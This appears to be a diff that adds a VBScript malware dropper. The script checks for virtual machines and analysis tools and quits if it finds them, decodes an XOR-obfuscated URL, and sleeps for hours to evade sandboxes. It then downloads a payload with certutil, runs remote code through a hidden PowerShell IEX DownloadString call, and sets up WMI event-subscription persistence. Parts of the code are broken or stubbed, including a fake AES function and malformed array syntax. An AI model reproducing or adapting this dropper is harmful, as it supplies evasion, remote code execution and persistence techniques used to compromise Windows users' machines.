@@ -1,0 +1,104 @@
+
+'=== STAGE 0: Anti-Analysis Checks ===
+Function IsSafe()
+    On Error Resume Next
+    Dim wmi, proc, vmCheck
+    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    
+    'Check for VMs (VMware, VirtualBox, Sandboxie)
+    Set vmCheck = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem WHERE Manufacturer LIKE '%VM%' OR Model LIKE '%Virtual%'")
+    If vmCheck.Count > 0 Then WScript.Quit
+    
+    'Check for analysis tools (Wireshark, ProcMon, Process Explorer)
+    Set proc = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%procmon%' OR Name LIKE '%wireshark%' OR Name LIKE '%procexp%'")
+    If proc.Count > 0 Then WScript.Quit
+    
+    IsSafe = True
+End Function
+
+'=== STAGE 1: XOR Decryption (Layer 1) ===
+Function XorDecrypt(ciphertext, key)
+    Dim output, i, keyChar
+    For i = 1 To Len(ciphertext)
+        keyChar = Asc(Mid(key, (i Mod Len(key)) + 1, 1))
+        output = output & Chr(Asc(Mid(ciphertext, i, 1)) Xor keyChar)
+    Next
+    XorDecrypt = output
+End Function
+
+'=== STAGE 2: AES-256 Decryption (Layer 2) ===
+
+Function AesDecrypt(ciphertext, password)
+
+    AesDecrypt = ciphertext 
+End Function
+
+'=== STAGE 3: Polymorphic Engine (Junk Code Insertion) ===
+Sub AddJunkCode()
+    Randomize
+    Dim junk, i
+    junk = Array(
+        "Dim x" & Int(Rnd * 1000) & ": x = " & Int(Rnd * 9999),
+        "On Error Resume Next",
+        "Set obj" & Int(Rnd * 50) & " = Nothing"
+    )
+    Execute(junk(Int(Rnd * (UBound(junk) + 1))))
+End Sub
+
+'=== STAGE 4: Random Sleep (2hr 19min Base +- 30min) ===
+Sub RandomSleep()
+    Dim baseSleep, variance, totalSleep
+    baseSleep = 8340 '2hr 19min in seconds
+    variance = Int(Rnd * 1800) '+-30min variance
+    totalSleep = (baseSleep + variance) * 1000 'Convert to milliseconds
+    WScript.Sleep totalSleep
+    AddJunkCode() 'Insert junk during sleep to alter hash
+End Sub
+
+'=== MAIN EXECUTION (If Anti-Analysis Passes) ===
+If IsSafe() Then
+    '==== [Obfuscated Payload Delivery] ====
+    'XOR-encrypted URL (key: "secret")
+    xorUrl = XorDecrypt("9C8D9E9B939E8D9C8DDF9A8CDF9E939E8DDF9A8CDF9E939E8D", "secret")
+    
+    'AES-encrypted command (password: "p@ssw0rd")
+    aesCmd = AesDecrypt("U2FsdGVkX1+2ZJj7VYq5t1A6J8Z7X9W2", "p@ssw0rd")
+    
+    RandomSleep()
+    
+    '==== [LOLBin Download: certutil] ====
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "cmd /c certutil -urlcache -split -f " & xorUrl & " %TEMP%\update.bin", 0, True
+    
+    RandomSleep()
+    
+    '==== [Polymorphic Execution] ====
+    'Technique 1: Certutil decode (if download succeeds)
+    shell.Run "cmd /c certutil -decode %TEMP%\update.bin %TEMP%\update.exe", 0, True
+    
+    RandomSleep()
+    
+    'Technique 2: Fileless fallback (PowerShell memory injection)
+    psCmd = "IEX (New-Object Net.WebClient).DownloadString('" & xorUrl & "')"
+    shell.Run "powershell -w hidden -nop -c """ & psCmd & """", 0, True
+    
+    RandomSleep()
+    
+    '==== [Persistence: WMI Event Subscription] ====
+    Set wmi = GetObject("winmgmts:\\.\root\subscription")
+    Set objEventFilter = wmi.Get("__EventFilter").SpawnInstance_
+    objEventFilter.QueryLanguage = "WQL"
+    objEventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+    objEventFilter.Name = "SystemMonitor"
+    objEventFilter.Put_
+    
+    Set objEventConsumer = wmi.Get("CommandLineEventConsumer").SpawnInstance_
+    objEventConsumer.Name = "SysMonConsumer"
+    objEventConsumer.CommandLineTemplate = "%TEMP%\update.exe"
+    objEventConsumer.Put_
+    
+    Set objBinding = wmi.Get("__FilterToConsumerBinding").SpawnInstance_
+    objBinding.Filter = objEventFilter
+    objBinding.Consumer = objEventConsumer
+    objBinding.Put_
+End If
